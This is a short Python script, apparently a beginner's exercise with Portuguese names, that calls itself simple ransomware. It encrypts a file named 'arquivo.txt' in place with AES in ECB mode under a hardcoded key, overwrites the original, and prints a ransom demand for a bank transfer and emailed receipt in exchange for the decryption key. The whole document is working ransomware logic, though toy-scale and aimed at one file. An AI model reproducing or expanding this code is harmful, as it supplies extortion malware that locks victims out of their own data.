from Crypto.Cipher import AES 
from Crypto.Util.Padding import pad, unpad
import os

def criptando(arquivo, chave):
    aes = AES.new(chave, AES.MODE_ECB)
    with open(arquivo, 'rb') as file:
        dentro_doarquivo = pad(file.read(), AES.block_size)
        cifrado = aes.encrypt(dentro_doarquivo)
        print("Arquivo criptografado com sucesso!")
    with open(arquivo, 'wb') as file:
        file.write(cifrado)
        print("Arquivo original excluído e substituído pelo criptografado!")
def descriptando(arquivo, chave):
    aes = AES.new(chave, AES.MODE_ECB)
    with open(arquivo, 'rb') as arquivo1:
        arquivo_cifrado = arquivo1.read()
        decifrando = unpad(aes.decrypt(arquivo_cifrado), AES.block_size)
        print("Descriptografando o arquivo...")
    with open(arquivo, 'wb') as arquivo2:
        arquivo2.write(decifrando)
        print("Arquivo descriptografado com sucesso!")
    
# Ransomware simples.
chaves = b'vocefoienganadoo'
arquivos = 'arquivo.txt'
ransomware = criptando(arquivos, chaves)
print(f'Adeus {arquivos}, você foi criptografado!')
print('Você deseja recuperar o arquivo?')
escolha = input('<S> para sim ou <N> para não: ').upper()
if escolha == 'S':
    print('Para recuperar o arquivo, faça o seguinte procedimento: ')
    print('1. Envie 150 e cacetada mil reais para a minha conta bancária.')
    print('2. Envie o comprovante para o meu e-mail. \n lá você receberá a chave de descriptografia.')
    chaves = input('Digite a chave de descriptografia: ').encode()
    decifrar = descriptando(arquivos, chaves)
elif escolha == 'N':
    print('Você não quer recuperar o arquivo? Então adeus!')